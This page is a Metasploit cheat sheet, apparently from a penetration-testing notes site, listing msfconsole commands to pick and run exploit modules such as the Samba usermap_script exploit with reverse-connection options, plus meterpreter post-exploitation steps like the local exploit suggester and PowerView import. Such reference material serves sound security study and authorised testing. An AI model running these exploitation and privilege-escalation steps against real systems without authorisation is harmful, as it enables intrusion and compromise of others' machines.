---
title: "Metasploit"
date: 2025-7-25
tags: ["Exploitation", "Post-Exploitation", "Searchsploit", "Metasploit", "Vulnerability Scanning", "Exploit", "Meterpreter", "Windows", "Msfconsole"]
---

{{< tab set1 tab1 >}}msfconsole{{< /tab >}}
{{< tab set1 tab2 >}}meterpreter{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### Start Msfconsole

```console
msfconsole -q
```

#### General

```console
# Return to previous page
back
```

```console
# Upgrade session
sessions -u
```

```console
# Quit
exit
```

#### Search Exploit

```console
search <KEYWORD>
```

```console {class="sample-code"}
search samba
```

```console
use <NUM>
```

```console {class="sample-code"}
use 15
```

```console
# Choose by full path
use <MODULE_PATH>
```

```console {class="sample-code"}
use exploit/multi/samba/usermap_script
```

```console
# Show exploit settings
options
```

```console
# Set option, e.g.
set rhosts <TARGET>
```

```console
set lhost <LOCAL_IP>
```

```console
set lport <LOCAL_PORT>
```

```console
# Run exploit
run 
```

<small>*Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter*</small>

#### Add Scripts from Searchsploit

```console
mkdir -p ~/.msf4/modules/exploits/linux
```

```console
mkdir -p ~/.msf4/modules/exploits/windows
```

```console
# For example a linux script
cp <SCRIPT> ~/.msf4/modules/exploits/linux
```

```console {class="sample-code"}
cp 12345.rb ~/.msf4/modules/exploits/linux
```

```console
# Inside msfconsole
reload_all
```

```console
# Search
search <SCRIPT>
```

#### Fix No Search Result

```console
# Inside msfconsole, check db status
db_status
```

```console
sudo service postgresql start
```

```console
update-rc.d postgresql enable
```

```console
sudo msfdb init
```

```console
# Go back to msfconsole and check again
db_status
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### General

```console
# Select session
sessions <SESSION_ID>
```

```console
# Return from meterpreter
background
```

#### Use Exploit

```console
# Quick look of potential privesc (Windows)
# Need to return from meterpreter
use post/multi/recon/local_exploit_suggester
```

```console
# Select opened session
set session 1
```

```console
# Show exploit settings
options
```

```console
# Set option, e.g.
set rhosts <TARGET>
```

```console
# Run exploit
run 
```

#### Use Powershell Module

```console
# Use powershell module
use powershell
```

```console
# Import module
powershell_import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
```

```console
# Spawn powershell session
powershell_shell 
```

{{< /tabcontent >}}
